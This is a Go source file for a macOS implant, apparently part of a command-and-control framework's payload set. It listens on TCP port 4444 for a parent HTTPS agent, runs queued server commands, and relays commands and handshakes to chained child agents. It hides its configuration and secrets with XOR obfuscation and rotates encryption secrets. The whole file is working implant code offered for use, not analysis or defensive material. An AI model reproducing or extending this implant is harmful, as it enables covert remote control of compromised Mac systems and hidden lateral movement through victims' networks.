// server/docker/payloads/TCP_Darwin/main.go
// TCP-based Darwin agent that communicates via TCP sockets through a parent HTTPS agent

//go:build darwin
// +build darwin

package main

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"os"
	"os/signal"
	"syscall"
	"time"
)

// Configuration variables - will be replaced at compile time via -ldflags
var (
	// XOR key for decrypting embedded values (same pattern as HTTPS agent)
	xorKey = ""

	// Embedded encrypted configuration blob (XOR encrypted with decrypted secret)
	encryptedConfig = ""

	// Initial client ID from build
	clientID = ""

	// Current sleep interval (seconds) and jitter (percentage)
	sleep  = "30"
	jitter = "10"

	// Secret for encryption (XOR encrypted with xorKey, decrypted at runtime)
	secret = ""

	// TCP port for the listener
	tcpPort = "4444"

	// Debug mode
	debugMode = "false"

	// TCP data transforms - embedded at build time, XOR encrypted with xorKey
	// When empty, no transforms are applied (legacy mode)
	tcpDataTransforms = ""
)

// Parsed TCP transforms - initialized on first use
var parsedTCPTransforms *SMBDataBlock

// Global managers
var (
	tcpListener   *TCPListener
	commandQueue  *CommandQueue
	resultManager *ResultManager
	secureComms   *SecureComms
)

// Track transform padding lengths for current connection
var currentPrependLen, currentAppendLen int

func debugLog(msg string) {
	if debugMode == "true" {
		fmt.Println("[TCP-DARWIN-DEBUG]", msg)
	}
}

func init() {
	// Parse embedded TCP transforms if configured
	if tcpDataTransforms != "" && xorKey != "" {
		// First Base64 decode, then XOR decrypt (matches server-side encryption)
		decoded, err := base64.StdEncoding.DecodeString(tcpDataTransforms)
		if err != nil {
			return
		}
		// Decrypt the transforms data using xorKey
		decrypted := xorDecryptBytes(decoded, []byte(xorKey))
		parsedTCPTransforms = parseSMBDataBlock(string(decrypted))
	}
}

// xorDecryptBytes decrypts data using XOR with key
func xorDecryptBytes(data, key []byte) []byte {
	if len(key) == 0 {
		return data
	}
	result := make([]byte, len(data))
	for i, b := range data {
		result[i] = b ^ key[i%len(key)]
	}
	return result
}

func main() {
	// Decrypt embedded configuration
	config, err := decryptConfig(encryptedConfig)
	if err != nil {
		os.Exit(1)
	}

	// Initialize command queue and result manager
	commandQueue = NewCommandQueue()
	resultManager = NewResultManager()

	// Get the TCP port to listen on
	activePort := tcpPort
	if configPort, ok := config["TCP Port"]; ok && configPort != "" {
		activePort = configPort
	}

	// Create the TCP listener
	tcpListener, err = NewTCPListener("0.0.0.0:" + activePort)
	if err != nil {
		os.Exit(1)
	}

	// Handle shutdown gracefully
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)

	go func() {
		<-sigChan
		tcpListener.Close()
		os.Exit(0)
	}()

	// Main loop - wait for connections from HTTPS agents
	for {
		conn, err := tcpListener.Accept()
		if err != nil {
			time.Sleep(time.Second)
			continue
		}

		// Handle connection in a goroutine
		go handleConnection(conn, config)
	}
}

func handleConnection(conn *TCPConnection, config map[string]string) {
	defer conn.Close()

	// Perform HMAC-based authentication with the connecting HTTPS agent
	// This is necessary because TCP is network-exposed (unlike local named pipes)
	if err := performAuth(conn); err != nil {
		return
	}

	// Perform handshake with the server via the parent HTTPS agent
	// Even if we already have clientID/keys, the connecting HTTPS agent needs
	// to receive our handshake data to complete the link
	if err := performHandshake(conn, config); err != nil {
		return
	}

	// Main message loop
	for {
		// Read message from HTTPS agent
		rawMessage, err := conn.ReadMessage()
		if err != nil {
			return
		}

		// Try to parse as legacy JSON format first
		var msgEnvelope struct {
			Type    string `json:"type"`
			Payload string `json:"payload"`
		}

		var messageData []byte
		var isTransformed bool

		if err := json.Unmarshal(rawMessage, &msgEnvelope); err == nil && msgEnvelope.Type != "" {
			// Successfully parsed as JSON with type field - legacy format
			isTransformed = false
			messageData = rawMessage
		} else if parsedTCPTransforms != nil && len(parsedTCPTransforms.Transforms) > 0 {
			// Not valid legacy JSON and we have transforms configured
			// Assume it's transformed data - reverse transforms to get JSON envelope
			reversed, err := reverseSMBTransforms(rawMessage, parsedTCPTransforms.Transforms, currentPrependLen, currentAppendLen)
			if err != nil {
				continue
			}

			// Parse the reversed data as JSON envelope
			if err := json.Unmarshal(reversed, &msgEnvelope); err != nil {
				continue
			}
			isTransformed = true
			messageData = reversed
		} else {
			// No transforms configured and not valid JSON - skip
			continue
		}

		// Store transform mode for response handling
		_ = isTransformed

		switch msgEnvelope.Type {
		case "data":
			handleServerData(conn, msgEnvelope.Payload)

		case "handshake_response":
			// Check for lr field that needs forwarding to children
			handleHandshakeResponseWithForwarding(messageData)

		case "link_handshake_response":
			// This is a forwarded handshake response for a child agent
			handleLinkHandshakeResponse(messageData)

		case "ping":
			// Heartbeat from parent - respond with pong to keep connection alive
			sendPong(conn)

		case "disconnect":
			return
		}

		_ = messageData
	}
}

func handleServerData(conn *TCPConnection, encryptedPayload string) {
	if secureComms == nil {
		return
	}

	// Decrypt the payload
	decrypted, err := secureComms.DecryptMessage(encryptedPayload)
	if err != nil {
		return
	}

	// Parse as JSON to check for nested link commands
	var payloadData map[string]interface{}
	if err := json.Unmarshal([]byte(decrypted), &payloadData); err != nil {
		// Legacy format - just commands array
		if err := commandQueue.AddCommands(decrypted); err != nil {
			return
		}
	} else {
		// New format - may have commands and/or link data

		// Process handshake responses for child agents FIRST (before commands)
		if linkRespVal, ok := payloadData["lr"]; ok {
			if linkRespData, ok := linkRespVal.([]interface{}); ok {
				processLinkHandshakeResponses(linkRespData)
			}
		}

		// Process link commands for child agents (forward to linked TCP agents)
		if linkCmdsVal, ok := payloadData["lc"]; ok {
			if linkCmdsData, ok := linkCmdsVal.([]interface{}); ok {
				processLinkCommands(linkCmdsData)
			}
		}

		// Extract commands array if present
		if cmdsVal, ok := payloadData["commands"]; ok {
			cmdsJSON, err := json.Marshal(cmdsVal)
			if err == nil {
				commandQueue.AddCommands(string(cmdsJSON))
			}
		}
	}

	// Process commands
	for {
		result, err := commandQueue.ProcessNextCommand()
		if err != nil {
			continue
		}
		if result == nil {
			break
		}
		// Add result to manager
		resultManager.AddResult(result)
	}

	// Collect link data from child TCP agents (if any)
	lm := GetLinkManager()
	linkData := lm.GetOutboundData()
	linkHandshake := lm.GetHandshakeData()
	unlinkNotifications := lm.GetUnlinkNotifications()

	hasResults := resultManager.HasResults()
	hasLinkData := len(linkData) > 0
	hasLinkHandshake := linkHandshake != nil
	hasUnlinkNotifications := len(unlinkNotifications) > 0

	// Send results back (including any link data from child agents)
	if hasResults || hasLinkData || hasLinkHandshake || hasUnlinkNotifications {
		results := resultManager.GetPendingResults()

		payload := map[string]interface{}{
			"agent_id": clientID,
		}

		if len(results) > 0 {
			payload["results"] = results
		}

		// Include link data from child agents (to be forwarded up the chain)
		if hasLinkData {
			payload["ld"] = linkData
		}

		// Include link handshake from child agents (via "lh" field)
		if hasLinkHandshake {
			payload["lh"] = linkHandshake
		}

		// Include unlink notifications from child agents
		if hasUnlinkNotifications {
			payload["lu"] = unlinkNotifications
		}

		jsonData, err := json.Marshal(payload)
		if err != nil {
			return
		}

		// Encrypt with our secret
		encrypted, err := secureComms.EncryptMessage(string(jsonData))
		if err != nil {
			return
		}

		// Send back through connection with transforms if configured
		sendTCPResponse(conn, encrypted)

		// Rotate secret
		secureComms.RotateSecret()
	} else {
		// Still need to send an empty response so parent knows we're done
		emptyPayload := map[string]interface{}{
			"agent_id": clientID,
		}
		jsonData, _ := json.Marshal(emptyPayload)
		encrypted, err := secureComms.EncryptMessage(string(jsonData))
		if err != nil {
			return
		}
		sendTCPResponse(conn, encrypted)
		secureComms.RotateSecret()
	}
}

// sendTCPResponse sends a response through the TCP connection
// NOTE: Transforms are NOT applied for parent-agent responses because the parent
// agent doesn't have this agent's transforms and can't reverse them.
// Transforms are only meant for HTTP server communication, not inter-agent links.
func sendTCPResponse(conn *TCPConnection, encryptedPayload string) error {
	// Create JSON envelope
	response := map[string]string{
		"type":    "data",
		"payload": encryptedPayload,
	}
	respJSON, err := json.Marshal(response)
	if err != nil {
		return err
	}

	// Write JSON directly - no transforms for parent-agent communication
	return conn.WriteMessage(respJSON)
}

// handleHandshakeResponseWithForwarding handles handshake responses that may contain
// lr data to forward to child agents (for grandchildren handshakes)
func handleHandshakeResponseWithForwarding(rawMessage []byte) {
	debugLog("[TCP-DARWIN-LINK] handleHandshakeResponseWithForwarding: checking for lr field")

	// Parse the message to check for lr field
	var msg struct {
		Type    string        `json:"type"`
		Payload string        `json:"payload"`
		LR      []interface{} `json:"lr"`
	}

	if err := json.Unmarshal(rawMessage, &msg); err != nil {
		debugLog(fmt.Sprintf("[TCP-DARWIN-LINK] handleHandshakeResponseWithForwarding: JSON parse error: %v", err))
		return
	}

	// Check if there's an lr field with data to forward
	if len(msg.LR) > 0 {
		debugLog(fmt.Sprintf("[TCP-DARWIN-LINK] handleHandshakeResponseWithForwarding: found %d lr items, forwarding to children", len(msg.LR)))
		processLinkHandshakeResponses(msg.LR)
	} else {
		debugLog("[TCP-DARWIN-LINK] handleHandshakeResponseWithForwarding: no lr data to forward")
	}
}

// handleLinkHandshakeResponse handles forwarded handshake responses from parent
// This is used when a grandchild agent's handshake response needs to pass through us
func handleLinkHandshakeResponse(rawMessage []byte) {
	debugLog("[TCP-DARWIN-LINK] handleLinkHandshakeResponse: received link_handshake_response")

	// Parse the message to extract the lr field
	var msg struct {
		Type string        `json:"type"`
		LR   []interface{} `json:"lr"`
	}

	if err := json.Unmarshal(rawMessage, &msg); err != nil {
		debugLog(fmt.Sprintf("[TCP-DARWIN-LINK] handleLinkHandshakeResponse: JSON parse error: %v", err))
		return
	}

	if len(msg.LR) == 0 {
		debugLog("[TCP-DARWIN-LINK] handleLinkHandshakeResponse: no lr data")
		return
	}

	debugLog(fmt.Sprintf("[TCP-DARWIN-LINK] handleLinkHandshakeResponse: processing %d lr items", len(msg.LR)))

	// Process the lr data - forward to our children
	processLinkHandshakeResponses(msg.LR)
}

// processLinkCommands forwards commands from parent to linked (child) TCP agents
// and waits for responses synchronously so they can be included in the same response cycle
func processLinkCommands(linkCmds []interface{}) {
	debugLog(fmt.Sprintf("[TCP-DARWIN-LINK] processLinkCommands: processing %d link commands", len(linkCmds)))
	lm := GetLinkManager()

	for i, cmd := range linkCmds {
		cmdMap, ok := cmd.(map[string]interface{})
		if !ok {
			debugLog(fmt.Sprintf("[TCP-DARWIN-LINK] processLinkCommands: cmd[%d] not a map", i))
			continue
		}

		routingID, _ := cmdMap["r"].(string)
		payload, _ := cmdMap["p"].(string)
		// Check if payload has transforms applied by server (t=true means raw bytes after base64 decode)
		transformed, _ := cmdMap["t"].(bool)

		debugLog(fmt.Sprintf("[TCP-DARWIN-LINK] processLinkCommands: cmd[%d] routingID=%s, payload_len=%d, transformed=%v", i, routingID, len(payload), transformed))

		if routingID == "" || payload == "" {
			debugLog(fmt.Sprintf("[TCP-DARWIN-LINK] processLinkCommands: cmd[%d] missing routingID or payload", i))
			continue
		}

		// Forward to the linked agent AND WAIT for response
		// If transformed=true, payload is base64-encoded transformed data - send as raw bytes
		debugLog(fmt.Sprintf("[TCP-DARWIN-LINK] processLinkCommands: forwarding cmd[%d] to routingID=%s (transformed=%v)", i, routingID, transformed))
		response, err := lm.ForwardToLinkedAgentAndWait(routingID, payload, transformed, 30*time.Second)
		if err != nil {
			debugLog(fmt.Sprintf("[TCP-DARWIN-LINK] processLinkCommands: cmd[%d] forward error: %v", i, err))
			continue
		}

		if response != nil {
			debugLog(fmt.Sprintf("[TCP-DARWIN-LINK] processLinkCommands: cmd[%d] GOT RESPONSE, payload_len=%d, queueing to outboundData", i, len(response.Payload)))
			// Queue the response for sending back to parent
			lm.queueOutboundData(response)
		} else {
			debugLog(fmt.Sprintf("[TCP-DARWIN-LINK] processLinkCommands: cmd[%d] response is nil (timeout?)", i))
		}
	}
	debugLog("[TCP-DARWIN-LINK] processLinkCommands: done processing link commands")
}

// processLinkHandshakeResponses forwards handshake responses from parent to child TCP agents
func processLinkHandshakeResponses(linkResps []interface{}) {
	lm := GetLinkManager()

	for _, resp := range linkResps {
		respMap, ok := resp.(map[string]interface{})
		if !ok {
			continue
		}

		routingID, _ := respMap["r"].(string)
		payload, _ := respMap["p"].(string)

		if routingID == "" || payload == "" {
			continue
		}

		// Get the link
		link, exists := lm.GetLink(routingID)
		if !exists {
			continue
		}

		// Send handshake response to child TCP agent
		// Include lr field so child can forward to grandchildren if needed
		message := map[string]interface{}{
			"type":    "handshake_response",
			"payload": payload,
			"lr":      []interface{}{respMap},
		}

		msgJSON, err := json.Marshal(message)
		if err != nil {
			continue
		}

		// Write to the linked agent's connection
		if err := link.WriteMessage(msgJSON); err != nil {
			continue
		}
	}
}

// decryptConfig decrypts the embedded configuration
func decryptConfig(encrypted string) (map[string]string, error) {
	if encrypted == "" {
		return map[string]string{}, nil
	}

	// Decrypt the secret first
	decryptedSecret := xorDecrypt(secret, xorKey)
	if decryptedSecret == "" {
		return nil, fmt.Errorf(Err(E18))
	}

	// Now decrypt the config with the decrypted secret
	configJSON := xorDecrypt(encrypted, decryptedSecret)
	if configJSON == "" {
		return nil, fmt.Errorf(Err(E18))
	}

	var config map[string]string
	if err := json.Unmarshal([]byte(configJSON), &config); err != nil {
		return nil, fmt.Errorf(ErrCtx(E18, err.Error()))
	}

	return config, nil
}

// sendPong sends a pong response to the parent agent
func sendPong(conn *TCPConnection) {
	response := map[string]string{
		"type": "pong",
	}
	respJSON, err := json.Marshal(response)
	if err != nil {
		return
	}

	conn.WriteMessage(respJSON)
}
